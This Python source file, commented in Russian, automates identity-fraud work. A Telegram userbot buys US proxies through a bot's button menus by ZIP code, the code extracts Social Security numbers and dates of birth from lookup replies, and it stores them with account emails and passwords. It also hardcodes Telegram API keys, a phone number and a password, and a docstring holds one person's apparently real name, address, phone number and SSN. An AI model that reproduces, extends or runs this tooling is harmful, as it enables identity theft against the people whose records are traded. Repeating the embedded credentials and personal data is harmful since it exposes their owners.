import asyncio
import json
import re
from cryptography.fernet import Fernet
import os
import sys
from datetime import datetime
import threading
import time
import traceback
from colorama import init, Fore, Style
import dariloder
from dariloder import tokenbot, admin_ids, send_admin_message
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import http.client
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import sqlite3
import psutil
import ctypes
import random
import telegram_session_manager

# -- Импортируем модуль для работы с OctoBrowser
import octo

# -- Настройки прокси бота в телеграме а точнее его айди
id_proxy_bot = "1909242405"

# --- Настройки для Telethon userbot ---
# Загружаем настройки из файла settings.json
try:
    with open('settings.json', 'r', encoding='utf-8') as f:
        settings = json.load(f)
    
    telegram_settings = settings.get('telegram_settings', {})
    TELEGRAM_API_ID = telegram_settings.get('api_id', 25760818)
    TELEGRAM_API_HASH = telegram_settings.get('api_hash', '5e76ccb9e484ad531ab03110d27ec6fe')
    TELEGRAM_PHONE = telegram_settings.get('phone', '+14129186337')
    TELEGRAM_GROUP_ID = telegram_settings.get('group_id', -4596462704)  # Используем значение из настроек
    password = telegram_settings.get('password', "^84z6E;V0?5/")
except Exception as e:
    print(f"Ошибка при загрузке настроек: {e}")
    TELEGRAM_API_ID = 25760818
    TELEGRAM_API_HASH = '5e76ccb9e484ad531ab03110d27ec6fe'
    TELEGRAM_PHONE = '+14129186337'
    TELEGRAM_GROUP_ID = -4596462704  # ID группы из настроек
    password = "^84z6E;V0?5/"

TG_BRO_GASPAR = "@bro_gaspar"
TG_BRO_GASPAR_USERNAME = "bro_gaspar"  # без собачки для API

# Серверный модуль удален

def extract_ssn_and_dob_from_telegram_response(response_text):
    """
    Извлекает SSN и дату рождения из ответа Telegram
    Формат: 1)Anela Mercado\n2135 S Depew St #N23\nDenver, CO 80227\nJanuary 2000\n(720) 731-3956\n🟢 652-12-1799 01/02/2000
    """
    try:
        lines = response_text.strip().split('\n')
        if len(lines) < 6:
            return None, None
            
        # Ищем строку с SSN и DOB (последняя строка)
        last_line = lines[-1]
        
        # Паттерны для поиска SSN и DOB
        ssn_pattern = r'(\d{3}-\d{2}-\d{4})'
        dob_pattern = r'(\d{2}/\d{2}/\d{4})'
        
        ssn_match = re.search(ssn_pattern, last_line)
        dob_match = re.search(dob_pattern, last_line)
        
        ssn = ssn_match.group(1) if ssn_match else None
        dob = dob_match.group(1) if dob_match else None
        
        return ssn, dob
    except Exception as e:
        print(f"Ошибка при извлечении SSN/DOB: {e}")
        return None, None

def save_ssn_and_dob_to_file(ssn, dob, email, password, full_data=None):
    """
    Сохраняет SSN и DOB в файл и полные данные в папку full/
    """
    try:
        today_str = datetime.now().strftime('%d-%m-%Y')
        file_path = os.path.join(os.path.dirname(__file__), 'data', f'{today_str}.txt')
        
        # Создаем директорию data, если она не существует
        data_dir = os.path.join(os.path.dirname(__file__), 'data')
        if not os.path.exists(data_dir):
            os.makedirs(data_dir)
        
        print_success(f"SSN: {ssn} и DOB: {dob} получены")
        
        # Сохраняем полные данные в папку full/
        if full_data:
            full_dir = os.path.join(os.path.dirname(__file__), 'full')
            if not os.path.exists(full_dir):
                os.makedirs(full_dir)
            
            # Используем один файл для всех данных
            full_file_path = os.path.join(full_dir, 'all_registrations.json')
            
            # Читаем существующие данные или создаем новый список
            existing_data = []
            if os.path.exists(full_file_path):
                try:
                    with open(full_file_path, 'r', encoding='utf-8') as f:
                        existing_data = json.load(f)
                except:
                    existing_data = []
            
            # Подготавливаем новые данные
            new_registration = {
                "email": email,
                "password": password,
                "ssn": ssn,
                "dob": dob,
                "registration_date": datetime.now().isoformat(),
                "full_data": full_data
            }
            
            # Добавляем новые данные к существующим
            existing_data.append(new_registration)
            
            # Сохраняем все данные в один файл
            with open(full_file_path, 'w', encoding='utf-8') as f:
                json.dump(existing_data, f, indent=2, ensure_ascii=False)
            
            print_success(f"Данные добавлены в файл: {full_file_path}")
        
        return True
    except Exception as e:
        print_error(f"Ошибка при сохранении SSN/DOB: {e}")
        return False
# Глобальные переменные для профиля
profile = None
save_profile = None
should_exit = False
request_message_id = None
bot_error = None  # Для хранения ошибки из потока бота
last_created_profile_id = None  # Для хранения ID последнего созданного профиля

# Используем функции из модуля octo

# Определяем функцию save_profile на глобальном уровне
def save_profile(profile_to_save):
    # Эта функция будет переопределена в main() с реальной реализацией
    pass

def load_profile():
    # Загружаем профиль из файла
    try:
        with open('settings.json', 'r', encoding='utf-8') as f:
            settings = json.load(f)
        return settings.get('profile', {})
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def start_bot():
    # Функция для запуска Telegram бота в отдельном потоке
    try:
        import dariloder
        import asyncio
        # Используем новый цикл событий для запуска асинхронной функции
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        # Запускаем корутину run_bot
        loop.run_until_complete(dariloder.run_bot())
    except Exception as e:
        print(f"Ошибка при запуске бота: {e}")

# Красивый ASCII-арт для заголовка программы
ascii_art = '''
╔══════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                  ║
║  ███████╗██╗  ██╗███████╗██╗   ██╗███████╗██╗   ██╗███████╗██╗  ██╗███████╗██████╗               ║
║  ██╔════╝██║  ██║██╔════╝╚██╗ ██╔╝██╔════╝╚██╗ ██╔╝██╔════╝╚██╗██╔╝██╔════╝██╔══██╗              ║
║  ███████╗███████║███████╗ ╚████╔╝ ███████╗ ╚████╔╝ █████╗  ╚███╔╝ █████╗  ██████╔╝               ║
║  ╚════██║██╔══██║╚════██║  ╚██╔╝  ╚════██║  ╚██╔╝  ██╔══╝  ██╔██╗ ██╔══╝  ██╔══██╗               ║
║  ███████║██║  ██║███████║   ██║   ███████║   ██║   ███████╗██╔╝ ██╗███████╗██║  ██║              ║
║  ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝              ║
║                                                                                                  ║
║  🚀 АВТОМАТИЗАЦИЯ РЕГИСТРАЦИИ И УПРАВЛЕНИЯ ПРОФИЛЯМИ 🚀                                         ║
║                                                                                                  ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════╝
'''


def gprint(text):
    print(f"{Fore.GREEN}{text}{Style.RESET_ALL}")

def rprint(text):
    print(f"{Fore.RED}{text}{Style.RESET_ALL}")

def yprint(text):
    print(f"{Fore.YELLOW}{text}{Style.RESET_ALL}")

def bprint(text):
    print(f"{Fore.BLUE}{text}{Style.RESET_ALL}")

def cprint(text):
    print(f"{Fore.CYAN}{text}{Style.RESET_ALL}")

def mprint(text):
    print(f"{Fore.MAGENTA}{text}{Style.RESET_ALL}")

def print_success(message):
    print(f"{Fore.GREEN}✅ {message}{Style.RESET_ALL}")

def print_error(message):
    print(f"{Fore.RED}❌ {message}{Style.RESET_ALL}")

def print_warning(message):
    print(f"{Fore.YELLOW}⚠️ {message}{Style.RESET_ALL}")

def print_info(message):
    print(f"{Fore.BLUE}ℹ️ {message}{Style.RESET_ALL}")

def clear_and_print_art():
    os.system('cls' if os.name == 'nt' else 'clear')
    gprint(ascii_art)
    print()

# Серверный модуль импортируется в функции main()

def print_profile():
        import re
        clear_and_print_art()
        
        # Красивая рамка для профиля
        cprint("╔══════════════════════════════════════════════════════════════════════════════════════╗")
        cprint("║                              👤 ПРОФИЛЬ ПОЛЬЗОВАТЕЛЯ                                 ║")
        cprint("╠══════════════════════════════════════════════════════════════════════════════════════╣")
        
        # Информация о профиле
        nickname = profile.get('nickname', 'Не указан')
        role = profile.get('role', 'Не указана')
        telegram = profile.get('telegram', 'Не указан')
        balance = profile.get('balance', 0)
        
        cprint(f"║  🏷️  Никнейм: {Fore.WHITE}{nickname:<50}{Fore.CYAN} ║")
        cprint(f"║  👑 Роль: {Fore.WHITE}{role:<50}{Fore.CYAN} ║")
        cprint(f"║  📱 Telegram: {Fore.WHITE}{telegram:<50}{Fore.CYAN} ║")
        cprint(f"║  💰 Баланс: {Fore.WHITE}{balance:<50}{Fore.CYAN} ║")
        avatar = profile.get('avatar','').strip()
        if not avatar:
            cprint(f"║  🖼️  Аватар: {Fore.WHITE}{'Не задан':<50}{Fore.CYAN} ║")
        elif re.match(r'^https?://', avatar):
            cprint(f"║  🖼️  Аватар: {Fore.WHITE}{'Ссылка':<50}{Fore.CYAN} ║")
            cprint(f"║      {Fore.WHITE}{avatar[:60]}{'...' if len(avatar)>60 else ''}{' '*(60-len(avatar[:60]))}{Fore.CYAN} ║")
        else:
            if not os.path.isfile(avatar):
                cprint(f"║      {Fore.RED}Файл аватара не найден: {avatar}{' '*(60-len(avatar)-30)}{Fore.CYAN} ║")
            else:
                try:
                    from PIL import Image
                except ImportError:
                    cprint(f"║      {Fore.YELLOW}Для отображения аватара установите: pip install pillow{' '*(60-50)}{Fore.CYAN} ║")
                    cprint("╚══════════════════════════════════════════════════════════════════════════════════════╝")
                    input("\nНажмите Enter для возврата в меню...")
                    return
                try:
                    # Настройки ASCII
                    ascii_chars = '@%#*+=-:. '
                    width = 40
                    img = Image.open(avatar)
                    wpercent = (width/float(img.size[0]))
                    hsize = int((float(img.size[1])*float(wpercent))/2)  # /2 для пропорций
                    img = img.resize((width, hsize))
                    img = img.convert('L')  # grayscale
                    ascii_lines = []
                    for y in range(img.height):
                        line = ''
                        for x in range(img.width):
                            pixel = img.getpixel((x, y))
                            line += ascii_chars[pixel * (len(ascii_chars)-1) // 255]
                        ascii_lines.append(line)
                    gprint("Аватар (ASCII-арт):")
                    border = '┌' + '─'*width + '┐'
                    print(border)
                    for l in ascii_lines:
                        print('│' + l + '│')
                    print('└' + '─'*width + '┘')
                except Exception as e:
                    gprint(f"[Не удалось отобразить аватар: {e}]")
        input("\nНажмите Enter для возврата в меню...")


async def send_start_to_proxy_bot_async(client=None, lines=None):
    """Отправляет /start боту прокси с обработкой ошибок"""
    try:
        # Принудительная перезагрузка настроек из файла
        global profile
        try:
            with open('settings.json', 'r', encoding='utf-8') as f:
                fresh_profile = json.load(f)
                # Обновляем глобальную переменную
                profile = fresh_profile
        except Exception as e:
            print_warning(f"⚠️ Не удалось загрузить свежие настройки: {e}")
            
        # Проверка переменной enable_proxy в глобальных настройках
        if not profile.get("proxy_settings", {}).get("enable_proxy_purchase", False):
            print_warning("⚠️ Автоматическая работа с прокси отключена в настройках")
            print_warning("⚠️ Будет выполнена только автоматизация Yahoo с получением SSN/DOB")
            if client and lines:
                # Указываем, что будет запущена только автоматизация Yahoo
                return "yahoo_sequence"
            else:
                return
            
        if client is None:
            # Если клиент не передан, создаем новый
            async with TelegramClient('userbot_session', TELEGRAM_API_ID, TELEGRAM_API_HASH) as client:
                await send_message_with_retry(client, int(id_proxy_bot), '/start')
                print(f"✓ /start отправлен боту {id_proxy_bot}")
                
                # Ждем 3 секунды перед обнаружением кнопок
                print("⏱️ Жду 3 секунды перед обнаружением кнопок...")
                await asyncio.sleep(3)
            
                # Ждем ответа бота и начинаем последовательность нажатия кнопок из настроек
                sequence = profile.get("proxy_settings", {}).get("proxy_purchase_sequence", [3, 6, 2, 4, 6])
                print(f"Используемая последовательность кнопок: {sequence}")
                await click_button_sequence(client, int(id_proxy_bot), lines, sequence)
        else:
            # Используем переданный клиент
            await send_message_with_retry(client, int(id_proxy_bot), '/start')
            print(f"✓ /start отправлен боту {id_proxy_bot}")
            
            # Ждем 3 секунды перед обнаружением кнопок
            print("⏱️ Жду 3 секунды перед обнаружением кнопок...")
            await asyncio.sleep(3)
        
            # Ждем ответа бота и начинаем последовательность нажатия кнопок из настроек
            sequence = profile.get("proxy_settings", {}).get("proxy_purchase_sequence", [3, 6, 2, 4, 6])
            print(f"Используемая последовательность кнопок: {sequence}")
            await click_button_sequence(client, int(id_proxy_bot), lines, sequence)
            
    except Exception as e:
        print_error(f"❌ Ошибка при отправке /start боту: {e}")
        print_info("🔄 Пробую альтернативные методы...")
        
        # Пробуем альтернативные методы
        try:
            await try_alternative_bot_connection(client, lines)
        except Exception as alt_e:
            print_error(f"❌ Альтернативные методы также не удались: {alt_e}")
            print_info("🔄 Продолжаю работу без настройки прокси")

async def send_message_with_retry(client, bot_id, message, max_retries=3):
    """Отправляет сообщение с повторными попытками и обработкой ошибок"""
    for attempt in range(max_retries):
        try:
            # Пробуем разные методы отправки
            try:
                # Метод 1: Прямая отправка по ID
                await client.send_message(bot_id, message)
                return
            except ValueError as e:
                if "Could not find the input entity" in str(e):
                    print_warning(f"⚠️ Попытка {attempt + 1}: Не удалось найти бота по ID, пробую альтернативные методы...")
                    
                    # Метод 2: Пробуем найти бота по username
                    try:
                        bot_username = get_bot_username_from_id(bot_id)
                        if bot_username:
                            await client.send_message(bot_username, message)
                            return
                    except:
                        pass
                    
                    # Метод 3: Пробуем через get_entity
                    try:
                        entity = await client.get_entity(bot_id)
                        await client.send_message(entity, message)
                        return
                    except:
                        pass
                    
                    # Метод 4: Пробуем через resolve_peer
                    try:
                        peer = await client.resolve_peer(bot_id)
                        await client.send_message(peer, message)
                        return
                    except:
                        pass
                    
                    # Метод 5: Пробуем через get_input_entity
                    try:
                        input_entity = await client.get_input_entity(bot_id)
                        await client.send_message(input_entity, message)
                        return
                    except:
                        pass
                    
                    # Если все методы не удались, ждем и пробуем снова
                    if attempt < max_retries - 1:
                        await asyncio.sleep(2)
                        continue
                    else:
                        raise ValueError(f"Не удалось отправить сообщение боту {bot_id} после {max_retries} попыток")
                else:
                    raise e
            except Exception as e:
                if attempt < max_retries - 1:
                    print_warning(f"⚠️ Попытка {attempt + 1} не удалась: {e}")
                    await asyncio.sleep(2)
                    continue
                else:
                    raise e
        except Exception as e:
            if attempt < max_retries - 1:
                print_warning(f"⚠️ Попытка {attempt + 1} не удалась: {e}")
                await asyncio.sleep(2)
                continue
            else:
                raise e
    
    raise Exception(f"Не удалось отправить сообщение после {max_retries} попыток")

def get_bot_username_from_id(bot_id):
    """Получает username бота по его ID (если известен)"""
    # Здесь можно добавить маппинг известных ботов
    bot_mapping = {
        "1909242405": "@proxy_bot_username",  # Замените на реальный username
        # Добавьте другие боты по необходимости
    }
    return bot_mapping.get(str(bot_id))

async def try_alternative_bot_connection(client, lines):
    """Пробует альтернативные методы подключения к боту"""
    try:
        print_info("🔄 Пробую альтернативные методы подключения...")
        
        # Метод 1: Пробуем через диалоги
        async for dialog in client.iter_dialogs():
            if dialog.is_user and dialog.entity.bot:
                print_info(f"Найден бот в диалогах: {dialog.name}")
                try:
                    await client.send_message(dialog.entity, '/start')
                    print_success("✓ Сообщение отправлено через диалоги")
                    await asyncio.sleep(3)
                    await wait_and_click_main_menu_button(client, dialog.entity, lines)
                    return
                except Exception as e:
                    print_warning(f"Не удалось отправить через диалог: {e}")
        
        # Метод 2: Пробуем через поиск
        try:
            search_results = await client.search_global('proxy')
            for result in search_results:
                if hasattr(result, 'bot') and result.bot:
                    print_info(f"Найден бот через поиск: {result.title}")
                    try:
                        await client.send_message(result, '/start')
                        print_success("✓ Сообщение отправлено через поиск")
                        await asyncio.sleep(3)
                        await wait_and_click_main_menu_button(client, result, lines)
                        return
                    except Exception as e:
                        print_warning(f"Не удалось отправить через поиск: {e}")
        except Exception as e:
            print_warning(f"Поиск не удался: {e}")
        
        raise Exception("Все альтернативные методы не удались")
        
    except Exception as e:
        print_error(f"❌ Альтернативные методы не удались: {e}")
        raise


async def wait_and_click_main_menu_button(client, bot_id, lines=None):
    """Ждет ответа от бота и нажимает 3-ю кнопку (Купить прокси)"""
    try:
        print("Жду ответа от бота и ищу 3-ю кнопку...")
        import asyncio
        for attempt in range(10):
            await asyncio.sleep(0.05)
            print(f"Попытка {attempt + 1}/10...")
            async for message in client.iter_messages(bot_id, limit=5):
                if message.buttons:
                    all_buttons = []
                    for row in message.buttons:
                        for button in row:
                            all_buttons.append(button)
                    
                    print(f"Найдено кнопок: {len(all_buttons)}")
                    for i, button in enumerate(all_buttons):
                        print(f"  Кнопка {i+1}: '{button.text}'")
                    
                    # Нажимаем 3-ю кнопку (индекс 2)
                    if len(all_buttons) >= 3:
                        target_button = all_buttons[2]  # 3-я кнопка (индекс 2)
                        print(f"✓ Нажимаю 3-ю кнопку: {target_button.text}")
                        await message.click(data=target_button.data)
                        await asyncio.sleep(0.1)
                        await wait_and_click_fifth_button_luxury(client, bot_id, lines)
                        return
                    else:
                        print(f"❌ Недостаточно кнопок. Найдено: {len(all_buttons)}, нужно: 3")
                        print("Доступные кнопки:")
                        for i, button in enumerate(all_buttons):
                            print(f"  {i+1}: {button.text}")
    except Exception as e:
        print(f"❌ Ошибка при поиске кнопки: {e}")
        import traceback
        traceback.print_exc()

async def wait_and_click_fifth_button_luxury(client, bot_id, lines=None):
    """Ждет сообщение и нажимает 5-ю кнопку (Luxury proxy)"""
    try:
        print("Жду сообщение и ищу 5-ю кнопку...")
        import asyncio
        for attempt in range(10):
            await asyncio.sleep(0.05)
            async for message in client.iter_messages(bot_id, limit=5):
                if message.buttons:
                    all_buttons = []
                    for row in message.buttons:
                        for button in row:
                            all_buttons.append(button)
                    
                    print(f"Найдено кнопок: {len(all_buttons)}")
                    for i, button in enumerate(all_buttons):
                        print(f"  Кнопка {i+1}: '{button.text}'")
                    
                    # Нажимаем 5-ю кнопку (индекс 4)
                    if len(all_buttons) >= 5:
                        target_button = all_buttons[4]  # 5-я кнопка (индекс 4)
                        print(f"✓ Нажимаю 5-ю кнопку: {target_button.text}")
                        await message.click(data=target_button.data)
                        await asyncio.sleep(0.1)
                        await wait_and_click_second_button(client, bot_id, lines)
                        return
                    else:
                        print(f"❌ Недостаточно кнопок. Найдено: {len(all_buttons)}, нужно: 5")
                        print("Доступные кнопки:")
                        for i, button in enumerate(all_buttons):
                            print(f"  {i+1}: {button.text}")
    except Exception as e:
        print(f"❌ Ошибка при поиске кнопки: {e}")
        import traceback
        traceback.print_exc()

async def wait_and_click_second_button(client, bot_id, lines=None):
    """Ждет сообщение и нажимает 2-ю кнопку (Luxury proxy OLD)"""
    try:
        print("Жду сообщение и ищу 2-ю кнопку...")
        import asyncio
        for attempt in range(10):
            await asyncio.sleep(0.05)
            async for message in client.iter_messages(bot_id, limit=5):
                if message.buttons:
                    all_buttons = []
                    for row in message.buttons:
                        for button in row:
                            all_buttons.append(button)
                    
                    print(f"Найдено кнопок: {len(all_buttons)}")
                    for i, button in enumerate(all_buttons):
                        print(f"  Кнопка {i+1}: '{button.text}'")
                    
                    # Нажимаем 2-ю кнопку (индекс 1)
                    if len(all_buttons) >= 2:
                        target_button = all_buttons[1]  # 2-я кнопка (индекс 1)
                        print(f"✓ Нажимаю 2-ю кнопку: {target_button.text}")
                        await message.click(data=target_button.data)
                        await asyncio.sleep(0.1)
                        await wait_and_click_fourth_button_zip(client, bot_id, lines)
                        return
                    else:
                        print(f"❌ Недостаточно кнопок. Найдено: {len(all_buttons)}, нужно: 2")
                        print("Доступные кнопки:")
                        for i, button in enumerate(all_buttons):
                            print(f"  {i+1}: {button.text}")
    except Exception as e:
        print(f"❌ Ошибка при поиске кнопки: {e}")
        import traceback
        traceback.print_exc()

async def wait_and_click_fourth_button_zip(client, bot_id, lines=None):
    """Ждет сообщение и нажимает 4-ю кнопку (По zip)"""
    try:
        print("Жду сообщение и ищу 4-ю кнопку...")
        import asyncio
        for attempt in range(10):
            await asyncio.sleep(0.05)
            async for message in client.iter_messages(bot_id, limit=5):
                if message.buttons:
                    all_buttons = []
                    for row in message.buttons:
                        for button in row:
                            all_buttons.append(button)
                    
                    print(f"Найдено кнопок: {len(all_buttons)}")
                    for i, button in enumerate(all_buttons):
                        print(f"  Кнопка {i+1}: '{button.text}'")
                    
                    # Нажимаем 4-ю кнопку (индекс 3)
                    if len(all_buttons) >= 4:
                        target_button = all_buttons[3]  # 4-я кнопка (индекс 3)
                        print(f"✓ Нажимаю 4-ю кнопку: {target_button.text}")
                        await message.click(data=target_button.data)
                        await asyncio.sleep(0.1)
                        await wait_and_click_sixth_button(client, bot_id, lines)
                        return
                    else:
                        print(f"❌ Недостаточно кнопок. Найдено: {len(all_buttons)}, нужно: 4")
                        print("Доступные кнопки:")
                        for i, button in enumerate(all_buttons):
                            print(f"  {i+1}: {button.text}")
    except Exception as e:
        print(f"❌ Ошибка при поиске кнопки: {e}")
        import traceback
        traceback.print_exc()

async def wait_and_click_sixth_button(client, bot_id, lines=None):
    """Ждет сообщение и нажимает 6-ю кнопку (North America)"""
    try:
        print("Жду сообщение и ищу 6-ю кнопку...")
        import asyncio
        for attempt in range(10):
            await asyncio.sleep(0.05)
            async for message in client.iter_messages(bot_id, limit=5):
                if message.buttons:
                    all_buttons = []
                    for row in message.buttons:
                        for button in row:
                            all_buttons.append(button)
                    
                    print(f"Найдено кнопок: {len(all_buttons)}")
                    for i, button in enumerate(all_buttons):
                        print(f"  Кнопка {i+1}: '{button.text}'")
                    
                    # Нажимаем 6-ю кнопку (индекс 5)
                    if len(all_buttons) >= 6:
                        target_button = all_buttons[5]  # 6-я кнопка (индекс 5)
                        print(f"✓ Нажимаю 6-ю кнопку: {target_button.text}")
                        await message.click(data=target_button.data)
                        await asyncio.sleep(0.1)
                        # После этого можно продолжить старой логикой (например, check_next_step)
                        await check_next_step(client, bot_id, lines)
                        return
                    else:
                        print(f"❌ Недостаточно кнопок. Найдено: {len(all_buttons)}, нужно: 6")
                        print("Доступные кнопки:")
                        for i, button in enumerate(all_buttons):
                            print(f"  {i+1}: {button.text}")
    except Exception as e:
        print(f"❌ Ошибка при поиске кнопки: {e}")
        import traceback
        traceback.print_exc()


# Новая функция для нажатия кнопок по порядковому номеру из настроек
async def click_button_sequence(client, bot_id, lines=None, sequence=[3, 6, 2, 4, 6]):
    """
    Обрабатывает последовательное нажатие кнопок из sequence
    Пример sequence: [3, 5, 2, 4, 6]
    """
    try:
        current_step = 0
        max_steps = len(sequence)
        
        while current_step < max_steps:
            button_number = sequence[current_step]
            button_index = button_number - 1  # Переводим номер кнопки в индекс (0-based)
            
            print(f"Шаг {current_step+1}/{max_steps}: Ищу кнопку номер {button_number} (индекс {button_index})...")
            
            # Ждем до 3 секунд для получения ответа от бота
            import asyncio
            for attempt in range(15):  # 15 попыток по 0.2 секунды = 3 секунды
                await asyncio.sleep(0.2)
                
                # Получаем последние сообщения от бота
                async for message in client.iter_messages(bot_id, limit=5):
                    if message.buttons:
                        all_buttons = []
                        for row in message.buttons:
                            for button in row:
                                all_buttons.append(button)
                        
                        print(f"Найдено кнопок: {len(all_buttons)}")
                        for i, button in enumerate(all_buttons):
                            print(f"  Кнопка {i+1}: '{button.text}'")
                        
                        # Проверяем, достаточно ли кнопок
                        if len(all_buttons) >= button_number:
                            target_button = all_buttons[button_index]
                            print(f"✓ Нажимаю кнопку {button_number}: {target_button.text}")
                            await message.click(data=target_button.data)
                            await asyncio.sleep(0.5)  # Увеличиваем паузу между нажатиями
                            
                            # Переходим к следующему шагу
                            current_step += 1
                            break
                        else:
                            print(f"❌ Недостаточно кнопок. Найдено: {len(all_buttons)}, нужно: {button_number}")
                
                # Если мы перешли к следующему шагу, прерываем цикл попыток
                if current_step > 0 and current_step % (max_steps + 1) != 0:
                    break
            
            # Если после всех попыток не смогли нажать текущую кнопку
            if current_step == 0 or current_step % (max_steps + 1) == 0:
                print(f"❌ Не удалось нажать кнопку {button_number} после всех попыток")
                print("🔄 Перезапускаю процесс со /start заново...")
                # Повторно отправляем /start и начинаем сначала
                await send_message_with_retry(client, bot_id, '/start')
                print(f"✓ /start отправлен боту {bot_id} (повторная попытка)")
                await asyncio.sleep(3)  # Даём боту время ответить
                # Перезапускаем последовательность с первой кнопки
                current_step = 0
                continue  # Продолжаем цикл вместо break
        
        # После завершения всей последовательности кнопок, переходим к следующему шагу
        if current_step == max_steps:
            print("✓ Успешно выполнена вся последовательность нажатий кнопок!")
            await check_next_step(client, bot_id, lines)
        else:
            print(f"❌ Не удалось выполнить полную последовательность. Выполнено шагов: {current_step}/{max_steps}")
            # Пробуем перейти к следующему шагу, несмотря на неполную последовательность
            await check_next_step(client, bot_id, lines)
            
    except Exception as e:
        print(f"❌ Ошибка при выполнении последовательности кнопок: {e}")
        import traceback
        traceback.print_exc()

# Удалены старые функции wait_and_click_luxury_proxy и wait_and_click_luxury_proxy_old
# Теперь используется новая логика из settings.json, по умолчанию: 3, 6, 2, 4, 6
# Последовательность нажатий кнопок:
# 1. 3-я кнопка (Купить прокси)
# 2. 6-я кнопка (Exclusive Proxy)
# 3. 2-я кнопка (Asia)
# 4. 4-я кнопка (По zip)
# 5. 6-я кнопка (North America)


async def wait_and_click_north_america(client, bot_id, lines=None):
    """Ждет сообщение с выбором континента и нажимает 'North America' или подобную кнопку (6-я кнопка)"""
    try:
        print("Жду сообщение с выбором континента или локации...")
        # Ждем до 0.5 секунд для получения ответа от бота
        import asyncio
        for attempt in range(10):  # 10 попыток по 0.05 секунды
            await asyncio.sleep(0.05)
            print(f"Попытка {attempt + 1}/10...")
            
            # Получаем последние сообщения от бота
            async for message in client.iter_messages(bot_id, limit=5):
                print(f"Проверяю сообщение: {message.text[:50]}...")
                if message.buttons:
                    print(f"Найдено сообщение с кнопками:")
                    
                    # Собираем все кнопки в один список
                    all_buttons = []
                    for row_index, row in enumerate(message.buttons):
                        for col_index, button in enumerate(row):
                            all_buttons.append(button)
                            print(f"  Кнопка {len(all_buttons)}: '{button.text}'")
                    
                    # Ищем подходящую кнопку - 6-я кнопка (индекс 5)
                    if len(all_buttons) >= 6:
                        target_button = all_buttons[5]  # 6-я кнопка (индекс 5)
                        print(f"✓ Найдена 6-я кнопка: {target_button.text}")
                        print("Нажимаем кнопку...")
                        await message.click(data=target_button.data)
                        print(f"✓ Кнопка '{target_button.text}' нажата")
                        
                        # Минимальная пауза для ответа бота
                        await asyncio.sleep(0.1)
                        
                        # Проверяем, нужен ли выбор страны или переходим сразу к выбору ZIP
                        await check_next_step(client, bot_id, lines)
                        return
                    else:
                        print(f"❌ Недостаточно кнопок. Найдено: {len(all_buttons)}, нужно: 6")
                        print("Доступные кнопки:")
                        for i, button in enumerate(all_buttons):
                            print(f"  {i+1}: {button.text}")
                else:
                    print("Сообщение без кнопок")
        
        print("❌ Подходящая кнопка не найдена в ответе бота после всех попыток")
        
    except Exception as e:
        print(f"❌ Ошибка при поиске кнопки: {e}")
        import traceback
        traceback.print_exc()

async def check_next_step(client, bot_id, lines=None):
    """Проверяет следующий шаг после выбора континента"""
    try:
        print("Проверяю следующий шаг...")
        # Ждем до 0.5 секунд для получения ответа от бота
        import asyncio
        for attempt in range(10):  # 10 попыток по 0.05 секунды
            await asyncio.sleep(0.05)
            print(f"Попытка {attempt + 1}/10...")
            
            # Получаем последние сообщения от бота
            async for message in client.iter_messages(bot_id, limit=5):
                print(f"Проверяю сообщение: {message.text[:50]}...")
                
                # Проверяем на запрос ZIP
                if message.text and ("zip" in message.text.lower() or "почтовый" in message.text.lower() or "индекс" in message.text.lower()):
                    print(f"✓ Найдено сообщение с запросом ZIP: {message.text[:100]}...")
                    await wait_and_send_zip_code(client, bot_id, lines)
                    return
                
                # Проверяем на наличие кнопок (выбор страны)
                if message.buttons:
                    print(f"✓ Найдено сообщение с кнопками (вероятно выбор страны)")
                    await wait_and_click_united_states(client, bot_id, lines)
                    return
            
        # Если ничего не нашли, пробуем продолжить с выбором страны
        print("Не найден конкретный следующий шаг, пробую выбор страны...")
        await wait_and_click_united_states(client, bot_id, lines)
        
    except Exception as e:
        print(f"❌ Ошибка при определении следующего шага: {e}")
        import traceback
        traceback.print_exc()


async def wait_and_click_united_states(client, bot_id, lines=None):
    """Ждет сообщение с выбором страны и нажимает кнопку 'United States' или похожую"""
    try:
        print("Жду сообщение с выбором страны...")
        # Ждем до 0.5 секунд для получения ответа от бота
        import asyncio
        for attempt in range(10):  # 10 попыток по 0.05 секунды
            await asyncio.sleep(0.05)
            print(f"Попытка {attempt + 1}/10...")
            
            # Получаем последние сообщения от бота
            async for message in client.iter_messages(bot_id, limit=5):
                print(f"Проверяю сообщение: {message.text[:50]}...")
                
                # Проверяем на запрос ZIP сначала
                if message.text and ("zip" in message.text.lower() or "почтовый" in message.text.lower() or "индекс" in message.text.lower()):
                    print(f"✓ Найдено сообщение с запросом ZIP: {message.text[:100]}...")
                    await wait_and_send_zip_code(client, bot_id, lines)
                    return
                
                # Затем проверяем на наличие кнопок
                if message.buttons:
                    print(f"Найдены кнопки в сообщении:")
                    
                    # Перебираем все кнопки и собираем в список
                    all_buttons = []
                    for row_index, row in enumerate(message.buttons):
                        for col_index, button in enumerate(row):
                            all_buttons.append(button)
                            print(f"  Кнопка {len(all_buttons)}: '{button.text}'")
                    
                    # Ищем подходящую кнопку
                    target_button = None
                    target_texts = ["united states", "сша", "usa", "united", "states", "америка"]
                    
                    for button in all_buttons:
                        button_text_lower = button.text.lower()
                        for target_text in target_texts:
                            if target_text in button_text_lower:
                                target_button = button
                                print(f"✓ Найдена кнопка по тексту '{target_text}': {button.text}")
                                break
                        if target_button:
                            break
                    
                    if target_button:
                        print(f"✓ Нажимаем кнопку: {target_button.text}")
                        await message.click(data=target_button.data)
                        print(f"✓ Кнопка '{target_button.text}' нажата")
                        
                        # Минимальная пауза для ответа бота
                        await asyncio.sleep(0.1)
                        
                        # Проверяем: если следующее сообщение содержит ZIP, переходим к вводу ZIP,
                        # иначе просто ждем следующего шага (может быть выбор города)
                        await check_zip_or_next_step(client, bot_id, lines)
                        return
                    else:
                        print(f"❌ Не найдена кнопка с названием страны")
                else:
                    print("Сообщение без кнопок")
        
        print("❌ Кнопка с выбором страны не найдена в ответе бота после всех попыток")
        print("Пробую продолжить и перейти к вводу ZIP-кода...")
        await wait_and_send_zip_code(client, bot_id, lines)
        
    except Exception as e:
        print(f"❌ Ошибка при поиске кнопки: {e}")
        import traceback
        traceback.print_exc()

